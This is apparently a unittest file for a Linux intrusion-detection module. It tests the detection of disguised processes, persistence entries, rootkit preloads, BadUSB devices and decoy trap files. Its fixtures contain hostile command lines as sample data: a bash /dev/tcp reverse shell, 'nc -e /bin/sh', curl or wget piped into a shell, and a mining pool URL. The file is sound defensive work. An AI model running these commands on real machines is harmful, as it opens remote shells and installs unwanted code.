import json
import os
from pathlib import Path
import subprocess
import sys
import tempfile
import time
import unittest
from types import SimpleNamespace
from unittest.mock import patch
import psutil
from detection import Detector, Traps, TRAP_HEADER, default_places, parse_proc_events, validate_threats


def row(pid=500,name='app',exe='/usr/bin/app',cmdline=(),ppid=1,cpu=0.):
    return dict(pid=pid,created=1.,name=name,exe=exe,cmdline=list(cmdline),ppid=ppid,cpu=cpu)


class DetectionTests(unittest.TestCase):
    def setUp(self):
        self.folder = tempfile.TemporaryDirectory()
        self.addCleanup(self.folder.cleanup)
        self.root = Path(self.folder.name)
        for name in ('home','proc','usb'):
            (self.root/name).mkdir()
        self.cron = ''
        self.detector = Detector(home=self.root/'home',proc=self.root/'proc',usb_root=self.root/'usb',
            config=self.root/'ignore.txt',read_crontab=lambda: self.cron,traps=False,preload=self.root/'preload',
            system_startup=(str(self.root/'etc'/'cron.d'/'*'),))
        patcher = patch('detection.psutil.net_connections',return_value=[])
        self.connections = patcher.start()
        self.addCleanup(patcher.stop)

    def reasons(self,*rows,cores=4,now=0.):
        found = self.detector.assess(list(rows),cores,now)['processes']
        return {f['pid']:(f['severity'],' '.join(f['reasons'])) for f in found}

    def test_normal_processes_are_quiet(self):
        rows = [row(),row(2,'kthreadd','',ppid=0),row(3,'kworker/0:1','',ppid=2),
                row(4,'AppRun','/tmp/.mount_abc/AppRun'),row(5,'bash',cmdline=['bash','-c','curl -o file https://x'])]
        self.assertEqual(self.reasons(*rows),{})
        self.assertEqual(self.detector.assess([],4,0.)['system'],[])

    def test_kernel_thread_masquerade_needs_no_exe_access(self):
        found = self.reasons(row(77,'kworker/0:2',None,ppid=1))
        self.assertEqual(found[77][0],'alta')
        self.assertIn('travestito',found[77][1])

    def test_temporary_and_deleted_executables(self):
        (self.root/'proc'/'9').mkdir()
        os.symlink('/home/u/.x/evil (deleted)',self.root/'proc'/'9'/'exe')
        (self.root/'proc'/'10').mkdir()
        os.symlink('/usr/bin/upgraded (deleted)',self.root/'proc'/'10'/'exe')
        found = self.reasons(row(7,'x','/dev/shm/x'),row(8,'y','/tmp/y'),row(9,'evil','/home/u/.x/evil'),row(10,'upgraded','/usr/bin/upgraded'))
        self.assertEqual(found[7][0],'alta')
        self.assertEqual(found[8][0],'media')
        self.assertIn('cancellato',found[9][1])
        self.assertNotIn(10,found)  # binaries replaced by a package upgrade are normal

    def test_command_lines(self):
        found = self.reasons(row(1,'bash',cmdline=['bash','-c','bash -i >& /dev/tcp/10.0.0.1/4444 0>&1']),
            row(2,'sh',cmdline=['sh','-c','curl -fsSL https://x/install.sh | sh']),
            row(3,'x',cmdline=['./x','-o','stratum+tcp://pool:3333']),
            row(4,'nc',cmdline=['nc','10.0.0.1','9','-e','/bin/sh']))
        self.assertEqual(found[1][0],'alta')
        self.assertEqual(found[2][0],'media')
        self.assertIn('miner',found[3][1])
        self.assertIn('Netcat',found[4][1])

    def test_sustained_cpu_outside_system_folders(self):
        home_tool, system_tool = row(1,'tool','/home/u/.local/bin/tool',cpu=50.), row(2,'make','/usr/bin/make',cpu=50.)
        for second in range(0,121,5):
            found = self.reasons(home_tool,system_tool,now=float(second))
            if second < 115:
                self.assertEqual(found,{})
        self.assertIn('core intero',found[1][1])
        self.assertNotIn(2,found)
        self.assertEqual(self.reasons(row(1,'tool','/home/u/.local/bin/tool',cpu=1.),now=400.),{})

    def test_suspicious_ports_are_attributed_to_pids(self):
        address = SimpleNamespace(ip='203.0.113.5',port=3333)
        self.connections.return_value = [SimpleNamespace(pid=6,raddr=address,laddr=None,status='ESTABLISHED'),
            SimpleNamespace(pid=7,raddr=SimpleNamespace(ip='203.0.113.5',port=443),laddr=None,status='ESTABLISHED')]
        found = self.reasons(row(6),row(7))
        self.assertIn('3333',found[6][1])
        self.assertNotIn(7,found)

    def test_startup_files_and_crontab(self):
        home = self.root/'home'
        (home/'.config'/'autostart').mkdir(parents=True)
        (home/'.config'/'autostart'/'x.desktop').write_text('[Desktop Entry]\nExec=/dev/shm/.x/run\n')
        (home/'.bashrc').write_text('alias ll="ls -l"\nexport TMPDIR=/tmp\n')
        self.cron = '* * * * * curl -s http://x/a | bash\n'
        reasons = [f['reason'] for f in self.detector.assess([],4,0.)['system']]
        self.assertEqual(len(reasons),2)
        self.assertTrue(any('x.desktop' in r for r in reasons) and any('crontab' in r for r in reasons))
        (self.root/'ignore.txt').write_text('# ok\ncrontab utente\n')
        self.assertEqual(len(self.detector.assess([],4,100.)['system']),1)

    def test_new_usb_keyboard_after_baseline(self):
        usb = self.root/'usb'
        def plug(port,product,storage=False):
            (usb/port).mkdir()
            for name,value in (('product',product),('idVendor','1234'),('idProduct','5678')):
                (usb/port/name).write_text(value)
            for i,(cls,proto) in enumerate([('03','01')]+([('08','50')] if storage else [])):
                (usb/f'{port}:1.{i}').mkdir()
                (usb/f'{port}:1.{i}'/'bInterfaceClass').write_text(cls)
                (usb/f'{port}:1.{i}'/'bInterfaceProtocol').write_text(proto)
        plug('1-1','Desk keyboard')
        self.assertEqual(self.detector.assess([],4,0.)['system'],[])
        plug('1-2','Flash drive',storage=True)
        found = self.detector.assess([],4,1.)['system']
        self.assertEqual([f['severity'] for f in found],['alta'])
        self.assertIn('BadUSB',found[0]['reason'])

    def test_system_startup_and_ld_preload_rootkit(self):
        (self.root/'etc'/'cron.d').mkdir(parents=True)
        (self.root/'etc'/'cron.d'/'job').write_text('*/5 * * * * root wget -q -O- http://x/s | sh\n')
        (self.root/'preload').write_text('/usr/lib/libhide.so\n')
        reasons = {f['reason']:f['severity'] for f in self.detector.assess([],4,0.)['system']}
        self.assertTrue(any('cron.d/job' in r for r in reasons))
        self.assertEqual([s for r,s in reasons.items() if 'ld.so.preload' in r],['alta'])

    def test_short_lived_process_seen_at_exec(self):
        quick = row(4321,'sh',exe='/dev/shm/dropper',cmdline=['/dev/shm/dropper'])
        self.detector.exec_seen(quick)
        self.detector.exec_seen(row(4322,'ls'))  # harmless: never stored
        alive = row(4323,'x',exe='/dev/shm/stays')
        self.detector.exec_seen(alive)
        system = self.detector.assess([alive],4,0.)['system']
        self.assertEqual(len(system),1)
        self.assertIn('breve durata PID 4321',system[0]['reason'])
        self.assertEqual(len(self.detector.assess([alive],4,1.)['system']),1)  # kept, not duplicated

    def test_exec_watcher_catches_a_one_millisecond_process(self):
        from detection import ExecWatcher
        try:
            watcher = ExecWatcher(self.detector)
        except OSError as exc:
            self.skipTest(f'proc connector non disponibile: {exc}')
        watcher.start()
        self.addCleanup(watcher.close)
        subprocess.run(['sh','-c','true # stratum+tcp://quick.invalid:3333'])
        time.sleep(.5)
        system = self.detector.assess([],4,0.)['system']
        self.assertTrue(any('breve durata' in s['reason'] and 'miner' in s['reason'] for s in system),system)

    def test_proc_connector_parser(self):
        import struct
        def message(what,pid,tgid):
            body = struct.pack('IIIIHH',1,1,0,0,40,0)+struct.pack('IIQ',what,0,0)+struct.pack('ii',pid,tgid)+bytes(16)
            return struct.pack('IHHII',16+len(body),3,0,0,0)+body
        self.assertEqual(parse_proc_events(message(2,50,50)+message(1,51,51)+message(2,52,50)),[(50,50),(52,50)])
        self.assertEqual(parse_proc_events(b'\x00'*8),[])

    def test_root_state_validation(self):
        good = dict(processes=[dict(pid=5,created=1.,severity='alta',reasons=['x'])],system=[dict(severity='media',reason='y')],traps=['/tmp/a'])
        self.assertIs(validate_threats(good),good)
        for bad in (dict(good,processes=[dict(pid=0,created=1.,severity='alta',reasons=['x'])]),dict(good,system=[dict(severity='critica',reason='x')]),
                    dict(good,traps=[1]),{k:v for k,v in good.items() if k != 'traps'}):
            with self.assertRaises(ValueError):
                validate_threats(bad)

    def test_ignore_list_by_executable(self):
        (self.root/'ignore.txt').write_text('/tmp/y\n')
        self.assertEqual(self.reasons(row(8,'y','/tmp/y')),{})

    def test_live_system_runs(self):
        rows = [dict(p.info,created=p.info['create_time'],cpu=None) for p in psutil.process_iter(['pid','name','exe','cmdline','ppid','create_time'])]
        detector = Detector(traps=Traps(places=[('/tmp','.ltm-test-{}.txt',0o644)],registry=self.root/'registry'))
        try:
            result = detector.assess(rows,os.cpu_count())
            self.assertEqual(set(result),{'processes','system','traps'})
            self.assertTrue(any(path.startswith('/tmp/') for path in result['traps']))
        finally:
            detector.close()
        self.assertFalse(any(Path(path).exists() for path in result['traps']))


class TrapTests(unittest.TestCase):
    def setUp(self):
        self.folder = tempfile.TemporaryDirectory()
        self.addCleanup(self.folder.cleanup)
        self.root = Path(self.folder.name)
        self.dirs = []
        for name in ('tmp','vartmp'):
            (self.root/name).mkdir()
            self.dirs.append(str(self.root/name))
        self.traps = Traps(places=[(d,'.trap-{}.txt',0o644) for d in self.dirs],registry=self.root/'registry')
        self.addCleanup(self.traps.close)
        self.traps.arm()
        self.first, self.second = [path for path,_ in self.traps.paths.values()]

    def test_traps_are_decoys_readable_by_everyone_and_kept_by_tmpfiles(self):
        self.assertEqual(self.first.parent,self.root/'tmp')
        self.assertEqual(self.first.stat().st_mode & 0o777,0o644)
        self.assertGreater(self.first.stat().st_mtime,time.time()+86400)
        self.assertEqual(self.traps.poll(),[])  # creating, arming and stat() must not trip it
        self.assertTrue(self.first.read_bytes().startswith(TRAP_HEADER))
        self.assertIn('aperta o letta',self.traps.poll()[0]['reason'])

    def test_read_is_reported_with_pid_of_a_process_holding_it_open(self):
        child = subprocess.Popen([sys.executable,'-c','import sys,time; f=open(sys.argv[1]); f.read(); print(1,flush=True); time.sleep(30)',str(self.first)],stdout=subprocess.PIPE)
        self.addCleanup(child.wait)
        self.addCleanup(child.kill)
        child.stdout.readline()
        detector = Detector(home=self.root,config=self.root/'none.txt',usb_root=self.root,read_crontab=str,traps=self.traps)
        with patch('detection.psutil.net_connections',return_value=[]):
            result = detector.assess([row(child.pid,'python3'),row(child.pid+1,'other')],4,0.)
        hits = result['system']
        self.assertEqual([h['severity'] for h in hits],['media'])
        self.assertIn('aperta o letta',hits[0]['reason'])
        self.assertIn(f'PID {child.pid}',hits[0]['reason'])
        self.assertEqual([p['pid'] for p in result['processes']],[child.pid])
        self.assertIn('file trappola',result['processes'][0]['reasons'][0])

    def test_modification_is_high_and_deletion_rearms(self):
        with open(self.first,'ab') as handle:
            handle.write(b'encrypted')
        self.assertEqual(self.traps.poll()[-1]['severity'],'alta')
        os.unlink(self.second)
        hit = self.traps.poll()[-1]
        self.assertEqual(hit['severity'],'media')
        self.assertIn('eliminata',hit['reason'])
        self.assertNotIn('permessi',hit['reason'])
        replacement = [p for p,_ in self.traps.paths.values() if p.parent == self.second.parent]
        self.assertEqual(len(replacement),1)
        self.assertNotEqual(replacement[0],self.second)
        self.assertTrue(replacement[0].exists())

    def test_close_and_stale_cleanup_remove_only_trap_files(self):
        stranger = self.root/'tmp'/'not-a-trap.txt'
        stranger.write_text('user data')
        registry = self.root/'registry'/'999999999.json'
        registry.write_text(json.dumps(dict(created=1.,paths=[str(self.first),str(stranger)])))
        other = Traps(places=[],registry=self.root/'registry')
        other.arm()
        other.close()
        self.assertFalse(self.first.exists())  # owner process 999999999 is gone
        self.assertTrue(stranger.exists())  # same registry entry, but no trap header
        self.assertFalse(registry.exists())
        self.assertTrue(self.second.exists())  # our live registry entry is untouched
        self.traps.close()
        self.assertFalse(self.second.exists())
        self.assertEqual(list((self.root/'registry').glob('*.json')),[])

    def test_default_places_cover_temp_and_localized_user_folders(self):
        home = self.root/'home'
        for folder in ('Documenti','Scrivania','.ssh','.config'):
            (home/folder).mkdir(parents=True)
        (home/'.config'/'user-dirs.dirs').write_text('XDG_DOCUMENTS_DIR="$HOME/Documenti"\nXDG_DESKTOP_DIR="$HOME/Scrivania"\nXDG_DOWNLOAD_DIR="$HOME/"\n')
        places = {(str(folder),mode) for folder,_,mode in default_places(home)}
        self.assertTrue({('/tmp',0o644),('/var/tmp',0o644),('/dev/shm',0o644)} <= places)
        self.assertEqual({p for p in places if p[0].startswith(str(home))},
            {(str(home),0o600),(str(home/'Documenti'),0o600),(str(home/'Scrivania'),0o600),(str(home/'.ssh'),0o600)})
        traps = Traps(places=[(home/'Documenti','.contratti-{}.docx',0o600)],registry=self.root/'registry2')
        traps.arm()
        try:
            path = next(iter(traps.paths.values()))[0]
            self.assertTrue(path.name.startswith('.contratti-'))  # hidden: desktop indexers skip it
            self.assertEqual(path.stat().st_mode & 0o777,0o600)
        finally:
            traps.close()
        self.assertEqual(list((home/'Documenti').iterdir()),[])

    def test_ignore_word_disables_traps(self):
        config = self.root/'ignore.txt'
        config.write_text('trappole\n')
        detector = Detector(home=self.root,config=config,usb_root=self.root,read_crontab=str,traps=self.traps)
        with patch('detection.psutil.net_connections',return_value=[]):
            self.assertEqual(detector.assess([],4,0.)['traps'],[])
        self.assertFalse(self.first.exists())


if __name__ == '__main__':
    unittest.main()
